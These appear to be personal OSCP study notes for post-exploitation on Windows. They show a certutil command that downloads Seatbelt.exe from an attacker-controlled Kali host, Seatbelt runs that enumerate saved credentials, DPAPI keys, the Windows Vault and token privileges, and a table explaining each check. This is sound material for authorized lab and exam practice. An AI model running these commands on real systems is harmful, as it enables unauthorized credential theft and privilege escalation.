# Transfer to target

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/Seatbelt.exe Seatbelt.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
.\seatbelt.exe -group=all -full -outputfile="C:\Users\eric.wallows\Documents\seatbelt.txt"
```

```
.\seatbelt.exe CredEnum DpapiMasterKeys RDCManFiles RDPSavedConnections WindowsCredentialFiles WindowsVault TokenGroups LogonSessions AutoRuns ScheduledTasks Services LocalGroups TokenPrivileges InterestingFiles -outputfile="C:\Users\eric.wallows\Documents\seatbelt-targeted.txt"
```

| Check                    | Why it matters                                    |
| ------------------------ | ------------------------------------------------- |
| `RDCManFiles`            | Saved RDP connections and potentially credentials |
| `CredEnum`               | Credentials saved through Windows APIs            |
| `WindowsCredentialFiles` | DPAPI-protected credential files                  |
| `WindowsVault`           | Saved Windows credentials                         |
| `LogonSessions`          | Users with active logon sessions                  |
| `AutoRuns`               | Programs configured to execute automatically      |
| `ScheduledTasks`         | Potentially interesting scheduled tasks           |
| `Services`               | Potential service misconfigurations               |
| `LocalGroups`            | Local group memberships                           |
| `TokenPrivileges`        | Privileges held by your current token             |
| `InterestingFiles`       | Potentially sensitive files                       |

2. Medium priority — recognise when they're relevant
- `Certificates`
- `LAPS`
- `PowerShellHistory`
- `MappedDrives`
- `NetworkShares`
- `Processes`
- `TcpConnections`
- `PuttySessions`
- `InstalledProducts`
- `AuditPolicies`
- `WindowsAutoLogon`